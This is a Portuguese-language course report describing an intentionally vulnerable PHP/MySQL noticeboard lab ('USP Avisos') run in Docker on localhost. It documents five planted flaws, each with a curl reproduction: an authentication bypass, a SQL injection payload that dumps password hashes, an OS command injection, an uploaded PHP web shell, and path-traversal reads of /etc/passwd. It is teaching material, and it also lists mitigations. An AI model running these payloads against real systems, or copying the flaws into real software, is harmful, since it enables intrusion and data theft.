\begin{abstract}
Este documento descreve a primeira parte do projeto de Engenharia de Segurança: um ambiente
containerizado com servidor web Apache, interpretador PHP 5.6.40 e banco MySQL 5.7, hospedando
um mural interno de avisos fictício (\textit{USP Avisos}: login, publicação, busca e recursos
auxiliares) com falhas intencionais. O objetivo é permitir
a demonstração de vulnerabilidades de aplicação web, incluindo intrusão pelo próprio site em PHP,
conforme o enunciado da disciplina \cite{enunciado}. O ambiente é exclusivamente educativo e não
deve ser publicado ou operado em produção.
\end{abstract}
\section{Introdução}

\subsection{Contexto e motivação}

A segurança de aplicações web depende de controles em várias camadas: autenticação, validação de
entrada, separação de privilégios no banco de dados e configuração do servidor. Falhas em qualquer
uma dessas camadas podem permitir que um atacante leia dados confidenciais, altere informações ou
execute código no servidor --- comprometendo a confidencialidade, a integridade e a disponibilidade
do sistema (tríade CIA).

O enunciado da disciplina solicita, na primeira parte, um provedor web com um site em PHP~5 que
contenha \emph{diversas vulnerabilidades exploráveis} e que permita \emph{intrusão pelo site}.
A entrega inclui configurações do Apache e do MySQL, os principais arquivos do site, um relatório
das vulnerabilidades e, quando possível, compartilhamento do ambiente via máquina virtual ou Docker.

\subsection{O aplicativo \textit{USP Avisos}}
\label{sec:usp-avisos}

O \textbf{USP Avisos} é o nome fictício do \emph{site} entregue nesta Parte~1: um mural eletrônico
de uso interno, no estilo de um quadro de avisos de unidade universitária (comunicados, lembretes e
informativos para servidores e estudantes). O cenário evoca o contexto da USP apenas como \emph{história
de laboratório}; não há vínculo com sistemas oficiais da universidade, nem o aplicativo deve ser
implantado fora do ambiente local do grupo.

Do ponto de vista pedagógico, o USP Avisos representa uma aplicação web pequena e legada --- PHP~5.6
com páginas procedurais e MySQL --- ainda comum em intranets antigas. Ele precisa ser \textbf{funcional
no fluxo honesto} (login, leitura e publicação de avisos) para que a banca possa contrastar o uso
normal com a exploração das falhas. As vulnerabilidades não são ``bugs acidentais'': foram plantadas
de propósito em rotinas que parecem recursos legítimos (busca, anexo, modelo de texto, teste de rede).

\textbf{Capacidades do sistema (uso legítimo).} Após autenticação por e-mail e senha, o usuário
acessa um menu com as seguintes funções, implementadas em PHP sob o diretório \texttt{site/}:

\begin{itemize}
    \item \textbf{Avisos} (\texttt{avisos.php}): lista os comunicados publicados, com autor e data;
          permite buscar avisos pelo título.
    \item \textbf{Publicar} (\texttt{publicar.php}): cadastra um novo aviso (título e corpo), associado
          ao usuário da sessão.
    \item \textbf{Impressora} (\texttt{impressora.php}): formulário de ``teste de alcance'' que envia
          um endereço de rede para verificação (recurso administrativo fictício do laboratório).
    \item \textbf{Modelos} (\texttt{modelo.php}): exibe modelos pré-definidos de texto para avisos
          (\texttt{site/modelos/}).
    \item \textbf{Anexos} (\texttt{anexo.php}): envio de arquivos para o diretório \texttt{site/anexos/}.
    \item \textbf{Meu usuário} (\texttt{usuario.php}): exibe dados básicos da conta autenticada;
          \textbf{Sair} (\texttt{sair.php}) encerra a sessão.
\end{itemize}

\textbf{Dados persistentes.} O MySQL armazena duas entidades principais: \texttt{usuarios} (nome,
e-mail, hash de senha) e \texttt{avisos} (título, corpo, autor e carimbo de tempo), conforme
\texttt{sql/init.sql}. Usuários de demonstração (Ivan, Daniel e Pedro, domínio fictício
\texttt{@avisos.br}) são criados na subida do container por \texttt{site/bin/criar-usuarios.php}.

\textbf{Papel no relatório.} Nas seções seguintes, ``o site'' ou ``o mural'' referem-se sempre a este
aplicativo USP Avisos: a arquitetura Docker o hospeda; as falhas intencionais estão mapeadas às
páginas acima; e o script \texttt{tests/fluxo.sh} imprime \texttt{[OK]} ou \texttt{[ERRO]} para cada
passo do fluxo normal e das cinco falhas do roteiro, indicando se o ambiente está pronto para a banca.

\subsection{Escopo e limites}

Este relatório cobre somente a Parte~1. Não fazem parte desta entrega: honeypot, varredura de rede
como componente do ambiente, IPsec, proxy interceptador, Snort, segunda máquina virtual, rsync e
crontab (previstos para alavancagem na Parte~2). O relatório registra, na Seção~\ref{sec:portas},
quais portas o host publica.

\subsection{Aviso legal e ético}

Todas as falhas descritas foram introduzidas de forma deliberada para fins acadêmicos. A exploração
deve restringir-se ao ambiente local do grupo (\texttt{localhost:8080}). O uso das técnicas aqui
documentadas contra sistemas de terceiros sem autorização é ilegal e antiético.

\section{Objetivos}

\begin{itemize}
    \item Disponibilizar um ambiente reproduzível (Docker Compose) com PHP~5.6.40 e MySQL~5.7.
    \item Implementar um mural interno funcional (login, avisos, publicação, recursos auxiliares).
    \item Incorporar falhas representativas de falhas de autenticação, injeção SQL, injeção de
          comando, upload inseguro e inclusão de arquivo local (LFI).
    \item Documentar vetores de ataque, impactos e medidas de mitigação hipotéticas.
    \item Preparar base técnica para a Parte~2 (ganho de privilégio e alavancagem entre máquinas).
\end{itemize}

\section{Arquitetura do ambiente}

\subsection{Visão geral}

O ambiente é composto por dois serviços na rede padrão do Docker Compose \cite{dockerCompose}:

\begin{itemize}
    \item \textbf{web}: imagem construída a partir de \texttt{php:5.6.40-apache}; publica a porta
          \texttt{8080} do host na porta \texttt{80} do container; monta \texttt{site/} como
          \texttt{DocumentRoot} (\texttt{/var/www/html}).
    \item \textbf{db}: imagem \texttt{mysql:5.7} com \texttt{platform: linux/amd64}; não publica
          porta no host; o PHP conecta pelo hostname \texttt{db}.
\end{itemize}

A URL de acesso é \url{http://localhost:8080}. Credenciais da aplicação: banco \texttt{app},
usuário \texttt{app}, senha \texttt{app}. Senha do root do MySQL no container: \texttt{laboratorio}
(uso administrativo interno).

\subsection{Fronteira de confiança}

Do ponto de vista de engenharia de segurança, a fronteira externa é a porta \texttt{8080} do host:
qualquer processo na máquina do usuário (ou na rede, se a porta estiver exposta) pode enviar
requisições HTTP ao mural. Após autenticação (legítima ou abusada), o atacante passa a interagir
com páginas autenticadas, incluindo as que executam comandos ou gravam arquivos no servidor.

O container \texttt{web} executa o PHP como usuário do Apache (\texttt{www-data}). Esse usuário
não é administrador do sistema, mas ainda possui permissão de leitura de grande parte do sistema
de arquivos do container e de escrita em diretórios montados (por exemplo, \texttt{site/anexos/}).

\subsection{Configuração do Apache}

O virtual host está em \texttt{apache/000-default.conf}. Destaques de segurança:

\begin{itemize}
    \item \texttt{Options -Indexes}: impede listagem automática de diretórios sem índice.
    \item \texttt{DocumentRoot} apontando para \texttt{/var/www/html}.
    \item Logs de erro e de acesso no padrão do Apache.
\end{itemize}

\subsection{Configuração do MySQL}

O arquivo \texttt{mysql/my.cnf} define \texttt{utf8mb4}, collation \texttt{utf8mb4\_unicode\_ci} e
\texttt{bind-address = 0.0.0.0} \emph{dentro} do container, para que o serviço \texttt{web} alcance o
banco pela rede interna do Compose. A ausência de mapeamento \texttt{ports:} no serviço \texttt{db}
evita expor a porta 3306 no host.

\subsection{Inicialização do banco e usuários}

O script \texttt{sql/init.sql} cria as tabelas \texttt{usuarios} e \texttt{avisos}. Os usuários de
demonstração (Ivan, Daniel e Pedro) são inseridos na subida por \texttt{site/bin/criar-usuarios.php},
com hashes gerados por \texttt{password\_hash} no PHP~5.6.

\section{Funcionamento do sistema}\label{sec:func}

Após login, o usuário autenticado pode:

\begin{itemize}
    \item listar e buscar avisos (\texttt{avisos.php});
    \item publicar avisos (\texttt{publicar.php});
    \item testar alcance de ``servidor de impressora'' (\texttt{impressora.php});
    \item visualizar modelos de aviso (\texttt{modelo.php});
    \item enviar anexos (\texttt{anexo.php});
    \item consultar perfil (\texttt{usuario.php}) e encerrar sessão (\texttt{sair.php}).
\end{itemize}

Credenciais de demonstração (senha \texttt{aviso123} para ambos):

\begin{center}
\begin{tabular}{ll}
\toprule
Nome & E-mail \\
\midrule
Ivan & \texttt{ivan@avisos.br} \\
Daniel & \texttt{daniel@avisos.br} \\
Pedro & \texttt{pedro@avisos.br} \\
\bottomrule
\end{tabular}
\end{center}

Os endereços \texttt{@avisos.br} são fictícios para o laboratório (não são caixas reais). A
prática de evitar domínios operacionais em documentação e testes é recomendada pela IETF
\cite{rfc2606}; o RFC~2606 reserva, entre outros, o TLD \texttt{.example} para exemplos.

\section{Superfície de exposição e portas}\label{sec:portas}

No host, a única porta publicada intencionalmente é \textbf{8080}, encaminhada à porta 80 do Apache.
O tráfego é HTTP em claro (sem TLS nesta entrega didática).

O MySQL escuta na rede interna do Compose (3306/tcp no container), sem publicação no host. Ferramentas
de varredura executadas \emph{no host} contra \texttt{localhost} encontrarão primariamente a 8080;
isso é coerente com o modelo de ``único ponto de entrada'' para o mural.

\section{Catálogo de vulnerabilidades}

A Tabela~\ref{tab:resumo} resume as falhas. Nas subseções seguintes, cada item é analisado com
vetor, pré-condições, reprodução, impacto na tríade CIA, classificação segundo OWASP Top 10
\cite{owasp2021} e CWE \cite{cwe} e mitigação hipotética.

\begin{table}[h]
\centering
\caption{Resumo das vulnerabilidades intencionais}
\label{tab:resumo}
\begin{tabular}{@{}p{3.2cm}p{3.5cm}p{4.5cm}p{2.8cm}@{}}
\toprule
\textbf{Falha} & \textbf{Arquivo(s)} & \textbf{Impacto principal} & \textbf{Demo} \\
\midrule
Autenticação fraca & \texttt{login.php}, \texttt{auth.php} & Personificação de usuário do mural & Relatório \\
Injeção SQL & \texttt{avisos.php} & Exfiltração via banco & Ao vivo \\
Injeção de comando & \texttt{impressora.php} & RCE como \texttt{www-data} & Relatório/terminal \\
Upload executável & \texttt{anexo.php}, \texttt{anexos/} & RCE persistente & Relatório/terminal \\
LFI & \texttt{modelo.php} & Leitura (e possível execução) de arquivos & Relatório/terminal \\
\bottomrule
\end{tabular}
\end{table}

\subsection{Autenticação fraca (quebra de autenticação)}

\textbf{Descrição.} O fluxo correto de autenticação valida e-mail e senha com
\texttt{password\_verify} em \texttt{entrar()}. Porém, \texttt{login.php} aceita também
\texttt{definir\_sessao\_por\_email()}, que associa a sessão ao usuário encontrado pelo e-mail
sem verificar a senha, desde que o campo senha não esteja vazio.

\textbf{Classificação.} OWASP Top 10:2021 --- A07:2021 \emph{Identification and Authentication Failures}
\cite{owasp2021}; CWE-287 \emph{Improper Authentication} \cite{cwe287}.

\textbf{Pré-condições.} Conhecimento do e-mail de um usuário cadastrado; acesso à página de login.

\textbf{Reprodução (navegador).} Informar \texttt{daniel@avisos.br} e senha arbitrária não
vazia; acessar \texttt{usuario.php} e observar identidade de Daniel.

\textbf{Reprodução (terminal).}
\begin{lstlisting}
jar=$(mktemp)
curl -s -c "$jar" -b "$jar" -o /dev/null \
  -d 'email=daniel@avisos.br&senha=qualquer' \
  http://localhost:8080/login.php
curl -s -c "$jar" -b "$jar" http://localhost:8080/usuario.php | grep 'Daniel'
rm -f "$jar"
\end{lstlisting}

\textbf{Impacto.}
\begin{itemize}
    \item \textbf{Confidencialidade:} acesso a páginas autenticadas como outro usuário.
    \item \textbf{Integridade:} publicação de avisos em nome de terceiros.
    \item \textbf{Disponibilidade:} indireta (conteúdo falso ou abusivo).
\end{itemize}

\textbf{Mitigação hipotética.} Remover o atalho de sessão por e-mail; exigir sempre
\texttt{password\_verify}; implementar MFA em ambientes reais; registrar tentativas falhas e
aplicar rate limiting.

\subsection{Injeção SQL na busca de avisos}

\textbf{Descrição.} Quando o parâmetro \texttt{q} não é vazio, \texttt{buscar\_titulo\_montado()}
concatena a entrada na cláusula \texttt{LIKE}. A listagem sem busca usa consulta preparada e não
apresenta o defeito --- ilustrando inconsistência de controles no mesmo módulo.

\textbf{Classificação.} OWASP Top 10:2021 --- A03:2021 \emph{Injection} \cite{owasp2021,owaspSql};
CWE-89 \emph{SQL Injection} \cite{cwe89}.

\textbf{Pré-condições.} Sessão autenticada (conta legítima ou obtida via falha de autenticação).

\textbf{Payload de demonstração.}
\begin{lstlisting}
x' UNION SELECT id, email, senha_hash, NOW(), nome FROM usuarios#
\end{lstlisting}

O apóstrofo encerra a string do \texttt{LIKE}; \texttt{UNION SELECT} projeta colunas compatíveis com
a renderização da página; \texttt{\#} comenta o restante da consulta original.

\textbf{Reprodução (terminal).}
\begin{lstlisting}
jar=$(mktemp)
curl -s -c "$jar" -b "$jar" -o /dev/null \
  -d 'email=ivan@avisos.br&senha=aviso123' \
  http://localhost:8080/login.php
curl -s -c "$jar" -b "$jar" -G --data-urlencode \
  "q=x' UNION SELECT id, email, senha_hash, NOW(), nome FROM usuarios#" \
  http://localhost:8080/avisos.php | grep -o 'daniel@avisos.br'
rm -f "$jar"
\end{lstlisting}

\textbf{Impacto.} Exfiltração de e-mails e hashes de senha da tabela \texttt{usuarios}; em cenários
mais permissivos no banco, potencial \texttt{UPDATE}/\texttt{DELETE}. A confidencialidade dos dados
da aplicação é comprometida.

\textbf{Mitigação hipotética.} Consultas parametrizadas em todos os caminhos \cite{phpPrepared,owaspSql};
ORM com binding seguro; princípio do menor privígio no usuário MySQL; monitoramento de consultas
anômalas.

\subsection{Injeção de comando no teste de impressora}

\textbf{Descrição.} \texttt{impressora.php} executa
\texttt{shell\_exec('ping -c 2 ' . \$host)}. Metacaracteres do shell (\texttt{;}, \texttt{\&\&},
\texttt{|}) permitem encadear comandos arbitrários.

\textbf{Classificação.} OWASP Top 10:2021 --- A03:2021 \emph{Injection} \cite{owasp2021};
CWE-78 \emph{OS Command Injection} \cite{cwe78}.

\textbf{Exemplo de entrada.} \texttt{127.0.0.1; id}

\textbf{Reprodução (terminal).}
\begin{lstlisting}
jar=$(mktemp)
curl -s -c "$jar" -b "$jar" -o /dev/null \
  -d 'email=ivan@avisos.br&senha=aviso123' \
  http://localhost:8080/login.php
curl -s -c "$jar" -b "$jar" -d 'host=127.0.0.1;+whoami' \
  http://localhost:8080/impressora.php | grep www-data
rm -f "$jar"
\end{lstlisting}

\textbf{Impacto.} Execução de código no servidor web como \texttt{www-data}: leitura de arquivos,
modificação de conteúdo web gravável, possível pivotagem na rede Docker. Atende ao requisito de
\textbf{intrusão pelo site em PHP~5}: o atacante deixa de ser apenas cliente HTTP e passa a
influenciar o sistema operacional do container.

\textbf{Mitigação hipotética.} Eliminar chamadas ao shell; validar entradas com lista branca; usar APIs
nativas; \texttt{disable\_functions} para \texttt{shell\_exec}, \texttt{system}, etc., quando aplicável.

\subsection{Upload de arquivo executável (web shell)}

\textbf{Descrição.} \texttt{anexo.php} grava uploads em \texttt{site/anexos/} preservando o nome
original, sem validação de tipo ou extensão. O Apache interpreta arquivos \texttt{.php} nesse
diretório.

\textbf{Classificação.} OWASP Top 10:2021 --- A04:2021 \emph{Insecure Design} e A05:2021
\emph{Security Misconfiguration} \cite{owasp2021,owaspUpload}; CWE-434 \emph{Unrestricted Upload of
File with Dangerous Type} \cite{cwe434}.

\textbf{Reprodução (terminal).}
\begin{lstlisting}
echo '<?php echo shell_exec($_GET["c"]); ?>' > /tmp/cmd.php
jar=$(mktemp)
curl -s -c "$jar" -b "$jar" -o /dev/null \
  -d 'email=ivan@avisos.br&senha=aviso123' \
  http://localhost:8080/login.php
curl -s -c "$jar" -b "$jar" -F 'arquivo=@/tmp/cmd.php' \
  http://localhost:8080/anexo.php
curl -s 'http://localhost:8080/anexos/cmd.php?c=whoami'
rm -f "$jar" /tmp/cmd.php
\end{lstlisting}

\textbf{Impacto.} \textbf{Persistência}: o atacante mantém um ponto de execução remota reutilizável
(backdoor em PHP), com efeito semelhante à injeção de comando, porém mais estável para reentrada.

\textbf{Mitigação hipotética.} Armazenar uploads fora do \texttt{DocumentRoot}; servir apenas como
download; renomear arquivos; validar MIME e extensão; impedir interpretação PHP na pasta de uploads.

\subsection{Inclusão de arquivo local (LFI)}

\textbf{Descrição.} \texttt{modelo.php} inclui arquivos a partir de
\texttt{site/modelos/ . \$modelo}, permitindo sequências \texttt{../} e wrappers \texttt{php://}.

\textbf{Classificação.} OWASP Top 10:2021 --- A03:2021 \emph{Injection} \cite{owasp2021};
CWE-22 \emph{Path Traversal} e CWE-829 \emph{Inclusion of Functionality from Untrusted Control
Sphere} \cite{cwe22,cwe829}.

\textbf{Exemplos de URL.}
\begin{itemize}
    \item \url{http://localhost:8080/modelo.php?modelo=../../../../etc/passwd}
    \item \url{http://localhost:8080/modelo.php?modelo=php://filter/convert.base64-encode/resource=/etc/passwd}
\end{itemize}

\textbf{Reprodução (terminal).}
\begin{lstlisting}
jar=$(mktemp)
curl -s -c "$jar" -b "$jar" -o /dev/null \
  -d 'email=ivan@avisos.br&senha=aviso123' \
  http://localhost:8080/login.php
curl -s -c "$jar" -b "$jar" \
  'http://localhost:8080/modelo.php?modelo=../../../../etc/passwd' \
  | grep -o 'root:.*'
rm -f "$jar"
\end{lstlisting}

\textbf{Impacto.} Leitura de arquivos sensíveis do sistema (\texttt{/etc/passwd}, configurações).
Se o alvo incluído for código PHP, pode haver execução. Suporta reconhecimento interno útil à
Parte~2 (identificação de serviços e caminhos no servidor).

\textbf{Mitigação hipotética.} Mapeamento fixo de modelos permitidos; rejeitar \texttt{..} e
wrappers; \texttt{basename()}; nunca passar entrada do usuário diretamente a \texttt{include}.


\section{Procedimento de implantação}

O passo a passo completo de instalação (Docker Desktop, primeira subida, parada do ambiente,
recriação do banco com \texttt{docker compose down -v}, credenciais de demonstração e roteiro para
a banca) está no arquivo \texttt{README.md} na raiz do repositório entregue. Este relatório resume
apenas o essencial para reproduzir o ambiente.

Na pasta do projeto:
\begin{lstlisting}
docker compose up -d --build
\end{lstlisting}

Verificação rápida: \url{http://localhost:8080/login.php} (HTTP 200); \texttt{docker compose exec web php -v}
deve reportar PHP 5.6.40. O script \texttt{tests/fluxo.sh} automatiza essas checagens e as dos
cenários de ataque (detalhes no \texttt{README.md}, seção~7).

Em Apple Silicon, a primeira subida do MySQL~5.7 emulado (\texttt{linux/amd64}) pode levar vários
minutos (detalhes e dicas de diagnóstico no \texttt{README.md}).

\section{Conclusão e continuidade (Parte~2)}

O ambiente entregue atende ao escopo da Parte~1: stack documentada (Apache, MySQL, PHP~5.6), mural
funcional e conjunto de falhas que cobrem autenticação, injeção em banco, execução remota e leitura
de arquivos. As falhas de execução estabelecem \emph{footprint} no container \texttt{web} como
\texttt{www-data}, ponto de partida natural para a Parte~2 (comunicação com outra máquina, rsync,
crontab e alavancagem de privilégio), sem implementá-las neste relatório.

\section{Referências}

As referências seguem o formato numérico da IEEE \cite{ieeeStyle}. Foram escolhidas fontes
primárias ou amplamente aceitas na comunidade de segurança de software: taxonomia OWASP para
riscos em aplicações web, entradas CWE alinhadas a cada falha implementada, RFC da IETF para
nomes DNS de documentação, documentação oficial de PHP e Docker para a stack do laboratório, e o
enunciado do projeto como requisito acadêmico. URLs foram verificadas em setembro de 2026; o OWASP
Top 10:2021 permanece referência estável para classificação (edição 2025 disponível no mesmo
portal \cite{owaspPortal}).

\begin{thebibliography}{99}

\bibitem{ieeeStyle}
IEEE, ``IEEE Reference Guide,'' IEEE Author Center. [Online]. Available:
\url{https://journals.ieeeauthorcenter.ieee.org/wp-content/uploads/IEEE-Reference-Guide.pdf}.
Accessed: Sep. 30, 2026.

\bibitem{enunciado}
Material didático da disciplina de Engenharia de Segurança, ``Enunciado do Projeto --- Partes 1 e
2,'' documento interno, 2026, unpublished.

\bibitem{owasp2021}
OWASP Foundation, ``OWASP Top 10:2021,'' OWASP, 2021. [Online]. Available:
\url{https://owasp.org/Top10/}. Accessed: Sep. 30, 2026.

\bibitem{owaspPortal}
OWASP Foundation, ``OWASP Top 10 Project,'' OWASP. [Online]. Available:
\url{https://owasp.org/www-project-top-ten/}. Accessed: Sep. 30, 2026.

\bibitem{owaspSql}
OWASP Foundation, ``SQL Injection Prevention Cheat Sheet,'' OWASP Cheat Sheet Series. [Online].
Available: \url{https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html}.
Accessed: Sep. 30, 2026.

\bibitem{owaspUpload}
OWASP Foundation, ``File Upload Cheat Sheet,'' OWASP Cheat Sheet Series. [Online]. Available:
\url{https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html}. Accessed:
Sep. 30, 2026.

\bibitem{cwe}
MITRE Corporation, ``Common Weakness Enumeration (CWE),'' Version 4.17, MITRE. [Online].
Available: \url{https://cwe.mitre.org/}. Accessed: Sep. 30, 2026.

\bibitem{cwe287}
MITRE Corporation, ``CWE-287: Improper Authentication,'' MITRE. [Online]. Available:
\url{https://cwe.mitre.org/data/definitions/287.html}. Accessed: Sep. 30, 2026.

\bibitem{cwe89}
MITRE Corporation, ``CWE-89: Improper Neutralization of Special Elements used in an SQL
Command ('SQL Injection'),'' MITRE. [Online]. Available:
\url{https://cwe.mitre.org/data/definitions/89.html}. Accessed: Sep. 30, 2026.

\bibitem{cwe78}
MITRE Corporation, ``CWE-78: Improper Neutralization of Special Elements used in an OS Command
('OS Command Injection'),'' MITRE. [Online]. Available:
\url{https://cwe.mitre.org/data/definitions/78.html}. Accessed: Sep. 30, 2026.

\bibitem{cwe434}
MITRE Corporation, ``CWE-434: Unrestricted Upload of File with Dangerous Type,'' MITRE.
[Online]. Available: \url{https://cwe.mitre.org/data/definitions/434.html}. Accessed: Sep. 30,
2026.

\bibitem{cwe22}
MITRE Corporation, ``CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path
Traversal'),'' MITRE. [Online]. Available:
\url{https://cwe.mitre.org/data/definitions/22.html}. Accessed: Sep. 30, 2026.

\bibitem{cwe829}
MITRE Corporation, ``CWE-829: Inclusion of Functionality from Untrusted Control Sphere,'' MITRE.
[Online]. Available: \url{https://cwe.mitre.org/data/definitions/829.html}. Accessed: Sep. 30,
2026.

\bibitem{rfc2606}
D. Eastlake and A. Panitz, ``Reserved Top Level DNS Names,'' RFC 2606, BCP 32, IETF, Jun. 1999.
[Online]. Available: \url{https://www.rfc-editor.org/rfc/rfc2606.html}. Accessed: Sep. 30, 2026.

\bibitem{phpPrepared}
The PHP Group, ``Prepared Statements --- Mysqli quickstart,'' PHP Manual. [Online]. Available:
\url{https://www.php.net/manual/en/mysqli.quickstart.prepared-statements.php}. Accessed: Sep. 30,
2026.

\bibitem{dockerCompose}
Docker Inc., ``Docker Compose Overview,'' Docker Documentation. [Online]. Available:
\url{https://docs.docker.com/compose/}. Accessed: Sep. 30, 2026.

\end{thebibliography}